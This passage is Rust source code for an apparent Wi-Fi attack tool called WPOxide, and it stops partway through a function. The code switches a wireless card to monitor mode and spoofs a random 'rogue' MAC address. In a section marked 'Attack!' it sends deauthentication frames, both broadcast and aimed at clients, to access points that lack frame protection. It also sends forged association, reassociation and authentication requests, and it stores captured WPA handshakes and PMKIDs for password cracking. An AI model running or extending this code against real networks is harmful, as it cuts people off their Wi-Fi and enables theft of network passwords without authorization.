//mod netlinker;
mod devices;
mod ntlook;
mod rawsocks;
mod status;
mod tx;

extern crate libc;
extern crate nix;

use anyhow::Result;
use devices::AccessPointInformation;
use libc::EXIT_FAILURE;
use libwifi::frame::components::{
    FrameControl, MacAddress, ManagementHeader, RsnAkmSuite, RsnCipherSuite, SequenceControl,
    WpaAkmSuite, WpaCipherSuite, WpaInformation,
};
use libwifi::frame::{Authentication, DeauthenticationReason};

use ntlook::{generate_random_bytes, Sockets};

use radiotap::field::{AntennaSignal, Field};
use radiotap::Radiotap;
use tx::{build_probe_request_directed, build_probe_request_undirected};

use crate::devices::{
    FourWayHandshake, HandshakeStorage, WiFiDevice, WiFiDeviceList, WiFiDeviceType,
};
use crate::rawsocks::{open_socket_rx, open_socket_tx};
use crate::status::*;
use crate::tx::{
    build_association_request_org, build_authentication_frame_noack, build_deauthentication_fm_ap,
    build_deauthentication_fm_client, build_reassociation_request,
};
use libwifi::{Addresses, Frame};

use crossterm::{
    cursor::Hide, cursor::MoveTo, cursor::Show, execute, terminal, terminal::ClearType,
};

use std::fmt::Write;
use std::io;
use std::io::stdout;
use std::os::fd::{AsRawFd, OwnedFd};
use std::process::exit;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

fn epoch_to_string(epoch: u64) -> String {
    match UNIX_EPOCH.checked_add(Duration::from_secs(epoch)) {
        Some(epoch_time) => match SystemTime::now().duration_since(epoch_time) {
            Ok(duration_since) => {
                let elapsed_seconds = duration_since.as_secs();
                if elapsed_seconds > 3600 {
                    format!("{}h", elapsed_seconds / 3600)
                } else if duration_since.as_secs() > 60 {
                    format!("{}m", elapsed_seconds / 60)
                } else {
                    format!("{}s", elapsed_seconds)
                }
            }
            Err(_) => "Time is in the future".to_string(),
        },
        None => "Invalid timestamp".to_string(),
    }
}

struct WPOxideRuntime {
    rx_socket: OwnedFd,
    tx_socket: OwnedFd,
    access_points: WiFiDeviceList,
    unassoc_clients: WiFiDeviceList,
    rogue_client: MacAddress,
    handshake_storage: HandshakeStorage,
    frame_count: u64,
    eapol_count: u64,
    error_count: u64,
    ntsocks: Sockets,
    interface: ntlook::Interface,
    status_log: status::MessageLog,
}

impl WPOxideRuntime {
    pub fn new() -> Self {
        let mut ntsocks = ntlook::SocketsBuilder::new().build().unwrap();
        let access_points = WiFiDeviceList::new();
        let unassoc_clients = WiFiDeviceList::new();
        let handshake_storage = HandshakeStorage::new();
        let mut log = status::MessageLog::new(100);
        let interface_name: String = "panda0".to_string();
        let mut iface: Option<ntlook::Interface> = None;

        for interface in &ntsocks.interfaces {
            if let Some(ref name) = interface.name {
                if String::from_utf8(name.to_vec())
                    .expect("String From UTF-8 Failed")
                    .trim_matches(char::from(0))
                    == interface_name
                {
                    iface = Some(interface.clone()); // Clone the entire `interface`
                }
            }
        }

        if iface.is_none() {
            eprintln!("Interface not found.");
            exit(EXIT_FAILURE);
        }

        let idx = iface.clone().unwrap().index.unwrap();

        log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Setting {} down.", interface_name),
        ));
        ntsocks.set_interface_down(idx).ok();

        let rogue_client = MacAddress::random();
        log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Randomizing {} mac to {}", interface_name, rogue_client),
        ));
        ntsocks.set_interface_mac(idx, rogue_client.0.to_vec()).ok();

        log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Setting {} monitor mode.", interface_name),
        ));
        ntsocks.set_interface_monitor(idx).ok();

        log.add_message(StatusMessage::new(
            MessageType::Info,
            format!("Setting {} up.", interface_name),
        ));
        ntsocks.set_interface_up(idx).ok();

        let rx_socket = open_socket_rx(iface.clone().unwrap().index.unwrap())
            .expect("Failed to open RX Socket.");
        let tx_socket = open_socket_tx(iface.clone().unwrap().index.unwrap())
            .expect("Failed to open TX Socket.");

        log.add_message(StatusMessage::new(
            MessageType::Info,
            format!(
                "Sockets Opened Rx: {} Tx: {}",
                rx_socket.as_raw_fd(),
                tx_socket.as_raw_fd()
            ),
        ));
        WPOxideRuntime {
            ntsocks,
            rx_socket,
            tx_socket,
            frame_count: 0,
            eapol_count: 0,
            error_count: 0,
            handshake_storage,
            access_points,
            unassoc_clients,
            rogue_client,
            interface: iface.unwrap(),
            status_log: status::MessageLog::new(100),
        }
    }

    pub fn print_device_lists(&mut self, start_time: Instant) {
        match self.interface.index {
            Some(index) => {
                match self.ntsocks.get_interface_info(index) {
                    Ok(infos) => {
                        if let Some(first_info) = infos.first() {
                            self.interface = first_info.clone();
                        } else {
                            // Handle the case where infos is empty
                            eprintln!("No interface information found");
                            exit(-1);
                        }
                    }
                    Err(e) => {
                        // Handle the error from get_interface_info
                        eprintln!("Failed to get interface info: {}", e);
                        exit(-1);
                    }
                }
            }
            None => {
                // Handle the case where self.interface.index is None
                eprintln!("Interface index is None");
                exit(-1);
            }
        }

        let mut output = String::new();

        /////////// Print Status Bar ///////////

        // Elapsed Time
        let total_seconds = start_time.elapsed().as_secs();
        let hours = total_seconds / 3600;
        let minutes = (total_seconds % 3600) / 60;
        let seconds = total_seconds % 60;
        let time_str = format!("{:02}:{:02}:{:02}", hours, minutes, seconds);

        let status = format!(
            "{:^15} | {:^15} | {:^25} | {:^10}",
            format!(
                "Channel: {}",
                self.interface
                    .frequency
                    .as_ref()
                    .unwrap()
                    .channel
                    .as_ref()
                    .map_or("None".to_string(), |value| value.to_string())
            ),
            format!("Frames #: {}", self.frame_count),
            format!("Rogue Mac: {}", self.rogue_client),
            format!("Errors: {}", self.error_count)
        );
        writeln!(output, "{:<7} {:>7} | {:>80}", "WPOxide", time_str, status,).ok();
        writeln!(output, "{}", "-".repeat(101)).ok();

        /////////// Print Access Points ///////////

        let aps = format!("Access Points: {}", self.access_points.size());
        writeln!(
            output,
            "{} {} {}",
            "=".repeat((100 - aps.len()) / 2),
            aps,
            "=".repeat((100 - aps.len()) / 2)
        )
        .ok();

        writeln!(
            output,
            "{:<15} {:<4} {:<5} {:<5} {:<30} {:<10} {:<5} {:<5} {:<5}",
            "MAC Address", "CH", "RSSI", "Last", "SSID", "Clients", "Int.", "DONE", "PMKID",
        )
        .ok();

        let mut access_points: Vec<_> = self.access_points.get_devices().iter().collect();
        access_points.sort_by(|a, b| b.1.last_recv.cmp(&a.1.last_recv));

        let mut ap_len = 1;
        for (mac, device) in access_points.clone() {
            if ap_len < 19 {
                if let WiFiDeviceType::AccessPoint(ap_data) = &device.device_type {
                    let unknown = "Unknown SSID".to_string();
                    let mut ssid = ap_data.ssid.clone().unwrap_or(unknown);
                    if ssid == " " {
                        ssid = "Hidden SSID".to_string()
                    }
                    let clients_size = ap_data.client_list.clone().size();
                    let chan = if ap_data.channel.is_some() {
                        ap_data.clone().channel.unwrap().short_string()
                    } else {
                        "?".to_string()
                    };
                    let hss = self.handshake_storage.find_handshakes_by_ap(mac);
                    let mut pwnd_counter = 0;
                    let mut pmkid_counter = 0;
                    for (_, hs_list) in hss {
                        for fwhs in hs_list {
                            if fwhs.complete() {
                                pwnd_counter += 1;
                            }
                            if fwhs.has_pmkid() {
                                pmkid_counter += 1;
                            }
                        }
                    }
                    writeln!(
                        output,
                        "{:<15} {:<4} {:<5} {:<5} {:<30} {:<10} {:<5} {:<5} {:<5}",
                        mac.to_string(),
                        chan,
                        device.last_signal_strength.value.to_string(),
                        epoch_to_string(device.last_recv).to_string(),
                        ssid,
                        clients_size,
                        device.interactions,
                        if pwnd_counter > 0 {
                            '\u{2714}'.to_string()
                        } else {
                            " ".to_string()
                        },
                        if pmkid_counter > 0 {
                            '\u{2714}'.to_string()
                        } else {
                            " ".to_string()
                        },
                    )
                    .ok();
                    ap_len += 1;
                }
            } else {
                writeln!(
                    output,
                    "{:^100}",
                    format!("---- +{} more ----", access_points.len() - ap_len)
                )
                .ok();
                break;
            }
        }
        for _ in 0..(20 - ap_len) {
            writeln!(output).ok();
        }

        /////////// Print Clients ///////////

        let clnt = format!("Clients: {}", self.unassoc_clients.size());
        writeln!(
            output,
            "{} {} {}",
            "=".repeat((100 - clnt.len()) / 2),
            clnt,
            "=".repeat((100 - clnt.len()) / 2)
        )
        .ok();

        writeln!(
            output,
            "{:<15} {:<15} {:<8} {:<18} {:<40}",
            "MAC Address", "Access Point", "RSSI", "Last Seen", "Probes"
        )
        .ok();

        let mut client_devices: Vec<_> = self.unassoc_clients.get_devices().iter().collect();
        let binding = self.access_points.get_all_clients();
        let new_clients: Vec<_> = binding.iter().collect();
        client_devices.extend(new_clients);

        client_devices.sort_by(|a, b| b.1.last_recv.cmp(&a.1.last_recv));
        let mut client_len = 0;
        for (mac, device) in client_devices.clone() {
            if client_len < 15 {
                if let WiFiDeviceType::Station(station_data) = &device.device_type {
                    let ap = if let Some(access_point) = station_data.access_point.clone() {
                        access_point.to_string()
                    } else {
                        "".to_string()
                    };
                    writeln!(
                        output,
                        "{:<15} {:<15} {:<8} {:<18} {:<40}",
                        mac.to_string(),
                        ap,
                        if device.last_signal_strength.value != 0 {
                            device.last_signal_strength.value.to_string()
                        } else {
                            "".to_string()
                        },
                        epoch_to_string(device.last_recv),
                        station_data.clone().probes_to_string_list(),
                    )
                    .ok();
                    client_len += 1;
                }
            } else {
                writeln!(
                    output,
                    "{:^100}",
                    format!("---- +{} more ----", client_devices.len() - client_len)
                )
                .ok();
                client_len += 1;
                break;
            }
        }
        for _ in 0..(17 - client_len) {
            writeln!(output).ok();
        }
        writeln!(output, "{}", "-".repeat(101)).ok();

        /////////// Print Handshakes ///////////

        let clnt = format!("Handshakes: {}", self.handshake_storage.count());
        writeln!(
            output,
            "{} {} {}",
            "=".repeat((100 - clnt.len()) / 2),
            clnt,
            "=".repeat((100 - clnt.len()) / 2)
        )
        .ok();

        let headers = [
            "AP MAC",
            "Client MAC",
            "ESSID",
            "[M1 M2 M3 M4 MIC] COMPLETE | PMKID ",
        ];
        writeln!(
            output,
            "{:<15} {:<15} {:<30} {:<30}",
            headers[0], headers[1], headers[2], headers[3],
        )
        .ok();

        let mut print_handshakes: Vec<&FourWayHandshake> = Vec::new();
        let mut hs_len = 0;
        let binding = self.handshake_storage.get_handshakes();
        for (_, handshake_list) in &binding {
            for handshake in handshake_list {
                print_handshakes.push(handshake);
            }
        }

        print_handshakes.sort_by(|a, b| {
            b.last_msg
                .clone()
                .unwrap()
                .timestamp
                .cmp(&a.last_msg.clone().unwrap().timestamp)
        });
        for hs in print_handshakes {
            writeln!(
                output,
                "{:<15} {:<15} {:<30} {:<30}",
                hs.mac_ap.clone().unwrap().to_string(),
                hs.mac_client.clone().unwrap().to_string(),
                hs.essid_to_string(),
                hs.to_string()
            )
            .ok();
            hs_len += 1;
            if hs_len >= 6 {
                if self.handshake_storage.count() > 6 {
                    writeln!(
                        output,
                        "{:^100}",
                        format!(
                            "---- +{} more ----",
                            self.handshake_storage.count() - hs_len
                        )
                    )
                    .ok();
                }
                break;
            }
        }

        for _ in 0..(7 - hs_len) {
            writeln!(output).ok();
        }

        /////////// Print Status Messages ///////////

        writeln!(
            output,
            "{} Messages {}=",
            "=".repeat((99 - "Messages".len()) / 2),
            "=".repeat((99 - "Messages".len()) / 2)
        )
        .ok();
        let mut recent_messages = self.status_log.get_recent_messages(5);
        recent_messages.reverse();
        for message in recent_messages {
            writeln!(
                output,
                "{}: ({}) {}",
                message.timestamp.format("%Y-%m-%d %H:%M:%S UTC"),
                message.message_type,
                message.content
            )
            .ok();
        }

        /////////// Clear and Print ///////////

        execute!(stdout(), MoveTo(0, 0)).unwrap();
        execute!(stdout(), terminal::Clear(ClearType::All)).unwrap();
        print!("{}", output);
    }

    pub fn handle_packet(&mut self, packet: &[u8]) -> Result<(), radiotap::Error> {
        //let raw_packet = packet.clone();
        let radiotap = match Radiotap::from_bytes(packet) {
            Ok(radiotap) => radiotap,
            Err(error) => {
                /* println!(
                    "Couldn't read packet data with Radiotap: {:?}, error {error:?}",
                    &packet
                ); */
                self.error_count += 1;
                self.status_log.add_message(StatusMessage::new(
                    MessageType::Error,
                    format!("Couldn't read packet data with Radiotap: {error:?}",),
                ));
                return Err(error);
            }
        };
        self.frame_count += 1;
        let payload = &packet[radiotap.header.length..];
        match libwifi::parse_frame(payload) {
            Ok(frame) => match frame {
                Frame::Beacon(beacon_frame) => {
                    let bssid = beacon_frame.header.address_3;

                    let signal_strength = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);
                    if bssid.is_real_device() && !bssid.is_private() {
                        self.access_points.add_or_update_device(
                            bssid.clone(),
                            WiFiDevice::new_access_point(
                                bssid.clone(),
                                signal_strength,
                                beacon_frame.station_info.ssid.clone(),
                                beacon_frame.station_info.ds_parameter_set,
                                Some(AccessPointInformation {
                                    apie_essid: if beacon_frame.station_info.ssid.is_some() {
                                        Some(true)
                                    } else {
                                        None
                                    },
                                    gs_ccmp: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn.group_cipher_suite == RsnCipherSuite::CCMP {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    gs_tkip: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn.group_cipher_suite == RsnCipherSuite::TKIP {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    cs_ccmp: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn
                                            .pairwise_cipher_suites
                                            .contains(&RsnCipherSuite::CCMP)
                                        {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    cs_tkip: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn
                                            .pairwise_cipher_suites
                                            .contains(&RsnCipherSuite::TKIP)
                                        {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    rsn_akm_psk: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn.akm_suites.contains(&RsnAkmSuite::PSK) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    rsn_akm_psk256: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn.akm_suites.contains(&RsnAkmSuite::PSK256) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    rsn_akm_pskft: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn.akm_suites.contains(&RsnAkmSuite::PSKFT) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    wpa_akm_psk: if let Some(ref wpa) =
                                        beacon_frame.station_info.wpa_info
                                    {
                                        if wpa.akm_suites.contains(&WpaAkmSuite::Psk) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    ap_mfp: if let Some(ref rsn) =
                                        beacon_frame.station_info.rsn_information
                                    {
                                        if rsn.mfp_required {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                }),
                            ),
                        );
                    };

                    // Attack! //
                    let mut interacted = false;
                    if !self.handshake_storage.has_complete_handshake_for_ap(&bssid) {
                        let dev = if let Some(dev) = self.access_points.get_device(&bssid) {
                            dev
                        } else {
                            return Ok(());
                        };

                        if dev.interactions < 32 {
                            if let WiFiDeviceType::AccessPoint(ap_data) = &mut dev.device_type {
                                let beacon_count = ap_data.beacon_count;
                                if (beacon_count % 8) == 0 && ap_data.ssid.is_none() {
                                    let frx =
                                        build_probe_request_undirected(self.rogue_client.clone());
                                    let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                    self.status_log.add_message(StatusMessage::new(
                                        MessageType::Info,
                                        "Sent Undirected Probe Request".to_string(),
                                    ));
                                } /* else { This is sending way too many probe requests... we already have the info so let's just not...
                                      let frx = build_probe_request_directed(
                                          self.rogue_client.clone(),
                                          ap_data.ssid.clone().unwrap(),
                                      );
                                      let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                      self.status_log.add_message(StatusMessage::new(
                                          MessageType::Info,
                                          format!(
                                              "Sent Direct Probe Request: {}",
                                              ap_data.ssid.clone().unwrap()
                                          ),
                                      ));
                                  } */
                                if (beacon_count % 16) == 4 {
                                    // beacon_count mod 16 = 12
                                    // This means we send an association request

                                    if ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
                                        // RSN_AKM_PSK
                                        let rogue = self.rogue_client.clone();
                                        let frx = build_association_request_org(
                                            bssid.clone(),
                                            rogue.clone(),
                                            bssid.clone(),
                                            ap_data.ssid.clone(),
                                        );
                                        let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                        self.status_log.add_message(StatusMessage::new(
                                            MessageType::Info,
                                            format!(
                                                "Sent Association Request: {} => {}",
                                                rogue, bssid
                                            ),
                                        ));
                                        interacted = true;
                                    }
                                } else if (beacon_count % 16) == 8 {
                                    // beacon_count mod 16 = 8
                                    // Send reassociation
                                    if ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
                                        // RSN_AKM_PSK
                                        let ssid = beacon_frame.station_info.ssid.clone();
                                        let gcs = beacon_frame
                                            .station_info
                                            .rsn_information
                                            .clone()
                                            .unwrap()
                                            .group_cipher_suite;
                                        let pcs = beacon_frame
                                            .station_info
                                            .rsn_information
                                            .clone()
                                            .unwrap()
                                            .pairwise_cipher_suites;
                                        if let Some(client) = ap_data.client_list.get_random() {
                                            let frx = build_reassociation_request(
                                                bssid.clone(),
                                                client.mac_address.clone(),
                                                ssid,
                                                gcs,
                                                pcs,
                                            );
                                            let client_mac = client.mac_address.clone();
                                            let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                            self.status_log.add_message(StatusMessage::new(
                                                MessageType::Info,
                                                format!(
                                                    "Sent Reassociation: {} => {}",
                                                    client_mac, bssid
                                                ),
                                            ));
                                            interacted = true;
                                        }
                                    }
                                } else if (beacon_count % 16) == 12 {
                                    // beacon_count mod 16 = 4

                                    if !ap_data.information.ap_mfp.is_some_and(|mfp| mfp)
                                        && ap_data.information.akm_mask()
                                    {
                                        // Extract data needed for processing
                                        let random_client = ap_data
                                            .client_list
                                            .get_random()
                                            .map(|client| client.mac_address.clone());

                                        // Process based on the extracted data
                                        if let Some(mac_address) = random_client {
                                            // Deauth From AP
                                            let frx = build_deauthentication_fm_ap(bssid.clone(), mac_address.clone(), DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA);
                                            let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                            self.status_log.add_message(StatusMessage::new(
                                                MessageType::Info,
                                                format!(
                                                    "Sent Deauthentication Fm AP: {} => {}",
                                                    mac_address, bssid
                                                ),
                                            ));
                                            let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                            // Deauth From Client
                                            let frx = build_deauthentication_fm_client(bssid.clone(), mac_address.clone(), DeauthenticationReason::DeauthenticatedBecauseSTAIsLeaving);
                                            let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                            self.status_log.add_message(StatusMessage::new(
                                                MessageType::Info,
                                                format!(
                                                    "Sent Deauthentication Fm Client: {} => {}",
                                                    bssid, mac_address
                                                ),
                                            ));
                                            let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                            interacted = true;
                                        } else {
                                            // There is no client
                                            let frx = build_deauthentication_fm_ap(bssid.clone(), MacAddress([255,255,255,255,255,255]), DeauthenticationReason::Class3FrameReceivedFromNonassociatedSTA);
                                            let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                            self.status_log.add_message(StatusMessage::new(
                                                MessageType::Info,
                                                format!(
                                                    "Sent Deauthentication To All: {} => broadcast",
                                                    bssid,
                                                ),
                                            ));
                                            let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                            interacted = true;
                                        }
                                    }
                                } else if (beacon_count % 16) == 0 {
                                    // beacon_count mod 16 = 0
                                    // Auth Request to get M1
                                    let mut has_m1 = false;
                                    for (_, hslist) in
                                        self.handshake_storage.find_handshakes_by_ap(&bssid)
                                    {
                                        for fwhs in hslist {
                                            if fwhs.has_m1() {
                                                has_m1 = true;
                                            }
                                        }
                                    }
                                    if !has_m1 {
                                        let frx = build_authentication_frame_noack(
                                            bssid.clone(),
                                            self.rogue_client.clone(),
                                        );
                                        let _ = write_packet(self.tx_socket.as_raw_fd(), &frx);
                                        self.status_log.add_message(StatusMessage::new(
                                            MessageType::Info,
                                            format!(
                                                "Sent Authentication: {} => {}",
                                                self.rogue_client.clone(),
                                                bssid,
                                            ),
                                        ));
                                        interacted = true;
                                    }
                                }
                            }
                        }
                    }
                    // Increment interactions
                    if let Some(ap) = self.access_points.get_device(&bssid) {
                        if interacted {
                            ap.interactions += 1;
                        }
                        if let WiFiDeviceType::AccessPoint(ap_data) = &mut ap.device_type {
                            ap_data.beacon_count += 1;
                        }
                    }
                }
                Frame::ProbeRequest(probe_request_frame) => {
                    let client_mac = probe_request_frame.header.address_2; // MAC address of the client
                    let dest = probe_request_frame.header.address_1; // MAC address of the AP (BSSID)

                    if !client_mac.is_real_device() && !dest.is_broadcast() {
                        return Ok(());
                    }

                    let whitelist: [[u8; 3]; 3] = [[0, 80, 242], [80, 111, 154], [0, 16, 24]];

                    if !probe_request_frame.station_info.data.is_empty() {
                        for (tag, data) in probe_request_frame.station_info.data {
                            if data.len() >= 3 {
                                let data_array = [data[0], data[1], data[2]];
                                if tag == 221 && !whitelist.contains(&data_array) {
                                    /* self.status_log.add_message(StatusMessage::new(
                                        MessageType::Info,
                                        format!("PReq Ignored ({}) : {} {:?}", client_mac, tag, data),
                                    )); */
                                    return Ok(());
                                }
                            }
                        }
                    }

                    let signal_strength = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);
                    if client_mac != self.rogue_client {
                        match probe_request_frame.station_info.ssid {
                            None => self.unassoc_clients.add_or_update_device(
                                client_mac.clone(),
                                WiFiDevice::new_unassoc_station(
                                    client_mac.clone(),
                                    signal_strength,
                                    vec![],
                                ),
                            ),
                            Some(ssid) => {
                                // Direct probe request
                                self.unassoc_clients.add_or_update_device(
                                    client_mac.clone(),
                                    WiFiDevice::new_unassoc_station(
                                        client_mac.clone(),
                                        signal_strength,
                                        vec![ssid],
                                    ),
                                )
                            }
                        }
                    }
                }
                Frame::ProbeResponse(probe_response_frame) => {
                    // Assumption:
                    //  Only an AP will send a probe response.
                    //
                    let bssid = probe_response_frame.header.address_3;
                    let signal_strength = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);
                    if bssid.is_real_device() {
                        self.access_points.add_or_update_device(
                            bssid.clone(),
                            WiFiDevice::new_access_point(
                                bssid.clone(),
                                signal_strength,
                                probe_response_frame.station_info.ssid.clone(),
                                probe_response_frame.station_info.ds_parameter_set,
                                Some(AccessPointInformation {
                                    apie_essid: if probe_response_frame.station_info.ssid.is_some()
                                    {
                                        Some(true)
                                    } else {
                                        None
                                    },
                                    gs_ccmp: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn.group_cipher_suite == RsnCipherSuite::CCMP {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    gs_tkip: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn.group_cipher_suite == RsnCipherSuite::TKIP {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    cs_ccmp: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn
                                            .pairwise_cipher_suites
                                            .contains(&RsnCipherSuite::CCMP)
                                        {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    cs_tkip: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn
                                            .pairwise_cipher_suites
                                            .contains(&RsnCipherSuite::TKIP)
                                        {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    rsn_akm_psk: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn.akm_suites.contains(&RsnAkmSuite::PSK) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    rsn_akm_psk256: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn.akm_suites.contains(&RsnAkmSuite::PSK256) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    rsn_akm_pskft: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn.akm_suites.contains(&RsnAkmSuite::PSKFT) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    wpa_akm_psk: if let Some(wpa) =
                                        probe_response_frame.station_info.wpa_info
                                    {
                                        if wpa.akm_suites.contains(&WpaAkmSuite::Psk) {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                    ap_mfp: if let Some(ref rsn) =
                                        probe_response_frame.station_info.rsn_information
                                    {
                                        if rsn.mfp_required {
                                            Some(true)
                                        } else {
                                            Some(false)
                                        }
                                    } else {
                                        None
                                    },
                                }),
                            ),
                        )
                    };
                }
                Frame::Authentication(auth_frame) => {
                    // Assumption:
                    //  Authentication packets can be sent by the AP or Client.
                    //
                    let from_ds: bool = auth_frame.header.frame_control.from_ds();
                    let to_ds: bool = auth_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        auth_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        auth_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        auth_frame.header.address_2.clone()
                    } else {
                        auth_frame.header.address_1.clone()
                    };

                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    // Add BSSID to aps
                    if ap_addr.is_real_device() {
                        self.access_points.add_or_update_device(
                            ap_addr.clone(),
                            WiFiDevice::new_access_point(
                                ap_addr.clone(),
                                if from_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])?
                                },
                                None,
                                None,
                                None,
                            ),
                        )
                    };

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        self.unassoc_clients.add_or_update_device(
                            station_addr.clone(),
                            WiFiDevice::new_unassoc_station(
                                station_addr.clone(),
                                if to_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])?
                                },
                                vec![],
                            ),
                        );
                    }
                }
                Frame::Deauthentication(deauth_frame) => {
                    // Assumption:
                    //  Deauthentication packets can be sent by the AP or Client.
                    //
                    let from_ds: bool = deauth_frame.header.frame_control.from_ds();
                    let to_ds: bool = deauth_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        deauth_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        deauth_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        deauth_frame.header.address_2.clone()
                    } else {
                        deauth_frame.header.address_1.clone()
                    };

                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    // Add AP
                    if ap_addr.is_real_device() {
                        self.access_points.add_or_update_device(
                            ap_addr.clone(),
                            WiFiDevice::new_access_point(
                                ap_addr.clone(),
                                if from_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])?
                                },
                                None,
                                None,
                                None,
                            ),
                        )
                    };

                    // If client sends deauth... we should probably treat as unassoc?
                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        self.unassoc_clients.add_or_update_device(
                            station_addr.clone(),
                            WiFiDevice::new_unassoc_station(
                                station_addr.clone(),
                                if to_ds {
                                    signal
                                } else {
                                    AntennaSignal::from_bytes(&[0u8])?
                                },
                                vec![],
                            ),
                        );
                    }
                }
                Frame::Action(frame) => {
                    let from_ds: bool = frame.header.frame_control.from_ds();
                    let to_ds: bool = frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        frame.header.address_2.clone()
                    } else {
                        frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or rogue

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
